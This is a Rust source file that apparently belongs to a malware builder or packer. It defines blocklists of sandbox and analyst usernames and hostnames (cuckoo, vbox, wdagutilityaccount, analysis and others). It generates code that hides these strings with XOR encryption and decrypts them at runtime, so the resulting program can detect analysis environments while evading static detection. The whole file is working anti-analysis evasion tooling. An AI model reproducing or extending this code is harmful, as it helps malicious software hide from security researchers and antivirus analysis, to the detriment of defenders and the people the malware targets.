use rand::Rng;

const USER_BLOCKLIST: &[&str] = &[
    "sandbox",
    "malware",
    "virus",
    "test",
    "analyst",
    "cuckoo",
    "admin",
    "abby",
    "wdagutilityaccount",
];

const HOST_BLOCKLIST: &[&str] = &[
    "sandbox",
    "malware",
    "cuckoo",
    "vm-",
    "vbox",
    "win-",
    "analysis",
];

pub fn emit_encrypted_strings<R: Rng>(_rng: &mut R, key: &[u8; 32]) -> String {
    let mut s = String::new();
    s.push_str("#[allow(non_snake_case)]\n");
    s.push_str("static XK: [u8; 32] = [");
    for (i, b) in key.iter().enumerate() {
        if i > 0 {
            s.push(',');
        }
        s.push_str(&format!("{:#04x}", b));
    }
    s.push_str("];\n\n");

    s.push_str(&emit_list("USER_BLOCKLIST", USER_BLOCKLIST, key));
    s.push_str(&emit_list("HOST_BLOCKLIST", HOST_BLOCKLIST, key));

    s.push_str("fn svc_xor_str(enc: &[u8]) -> String {\n");
    s.push_str("    let dec: Vec<u8> = enc.iter().enumerate().map(|(i, x)| x ^ XK[i % XK.len()]).collect();\n");
    s.push_str("    String::from_utf8_lossy(&dec).to_string()\n");
    s.push_str("}\n\n");

    s
}

fn emit_list(name: &str, strings: &[&str], key: &[u8; 32]) -> String {
    let mut s = String::new();
    let lower = name.to_lowercase();

    s.push_str(&format!("static {}_ENC: [&[u8]; {}] = [\n", name, strings.len()));
    for st in strings {
        let enc: Vec<u8> = st
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();
        s.push_str("    &[");
        for (i, b) in enc.iter().enumerate() {
            if i > 0 {
                s.push(',');
            }
            s.push_str(&format!("{:#04x}", b));
        }
        s.push_str("],\n");
    }
    s.push_str("];\n");

    s.push_str(&format!(
        "#[allow(non_snake_case)]\nfn decrypt_{}_list() -> Vec<String> {{\n",
        lower
    ));
    s.push_str(&format!("    {}_ENC.iter().map(|b| {{\n", name));
    s.push_str("        let dec: Vec<u8> = b.iter().enumerate().map(|(i, x)| x ^ XK[i % XK.len()]).collect();\n");
    s.push_str("        String::from_utf8_lossy(&dec).to_string()\n");
    s.push_str("    }).collect()\n");
    s.push_str("}\n\n");

    s.push_str(&format!(
        "static {}_CACHE: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();\n",
        name
    ));

    s.push_str(&format!(
        "#[allow(non_snake_case)]\nfn {}() -> &'static Vec<String> {{\n",
        name
    ));
    s.push_str(&format!(
        "    {}_CACHE.get_or_init(|| decrypt_{}_list())\n",
        name, lower
    ));
    s.push_str("}\n\n");

    s
}
